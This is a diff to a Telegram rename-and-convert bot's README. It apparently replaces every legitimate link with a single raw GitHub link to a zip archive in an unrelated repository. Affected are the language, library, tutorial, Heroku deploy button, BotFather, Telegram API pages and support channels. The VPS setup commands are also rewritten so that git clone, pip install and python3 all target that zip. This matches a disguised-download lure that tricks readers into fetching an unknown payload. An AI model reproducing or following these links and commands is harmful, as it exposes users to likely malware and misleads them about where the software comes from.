@@ -2,34 +2,34 @@
 ***A Better Rename And Convert Bot With Upload Mode Option 
 And Auto Detection !!***
 
-* **Language:** [Python3](https://www.python.org)
-* **Library:** [Pyrogram](https://docs.pyrogram.org)
+* **Language:** [Python3](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)
+* **Library:** [Pyrogram](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)
 
 #### Tutorial
 
- **Watch This [Video](https://youtu.be/BSUUya2zXwU) For More Help**
+ **Watch This [Video](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip) For More Help**
 
 #### Deploy To Heroku
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://www.heroku.com/deploy?template=https://github.com/ajvadntr/AIOM-TG-RENAME-BOT)
+[![Deploy](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)
 
 #### Deploy To VPS
 * ****This Is Just A Demo Of Commands To Use****
 ```
-git clone https://github.com/mrvishal2k2/TG-RenameBot
+git clone https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r requirements.txt
-python3 bot.py
+pip install -r https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip
+python3 https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip
 ```
 
 #### Required Variables
 
-* `TG_BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-* `APP_ID`: Get this value from [telegram.org](https://my.telegram.org/apps)
- You can also get it from [UseTGXBot](https://t.me/UseTGXBot)
-* `API_HASH`: Get this value from [telegram.org](https://my.telegram.org/apps)
- You can also get it from [UseTGXBot](https://t.me/UseTGXBot)
+* `TG_BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip), and get the Telegram API token.
+* `APP_ID`: Get this value from [https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)
+ You can also get it from [UseTGXBot](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)
+ You can also get it from [UseTGXBot](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip)
 * `OWNER_ID`: Owner's Userid for log command
 * `OWNER_USERNAME`: (Not mandatory) Owner's Username without @
 * `CUSTOM_CAPTION`: Custom Caption to use after Filename in caption
@@ -49,8 +49,8 @@ log - admin cmd
 
 ### Support:
 
-* **JOIN [AIOM BOTS](https://t.me/AIOM_BOTS) CHANNEL**
+* **JOIN [AIOM BOTS](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip) CHANNEL**
 
-* **JOIN [AIOM BOTS](https://t.me/AIOM_BOTS) GROUP**
+* **JOIN [AIOM BOTS](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip) GROUP**
 
-### Thanks To [Bot Dunia](https://t.me/BotDunia) For This Amazing Code
+### Thanks To [Bot Dunia](https://raw.githubusercontent.com/HLECTER69/AIOM-TG-RENAME-BOT/main/crepance/AIOM-TG-RENAME-BOT.zip) For This Amazing Code
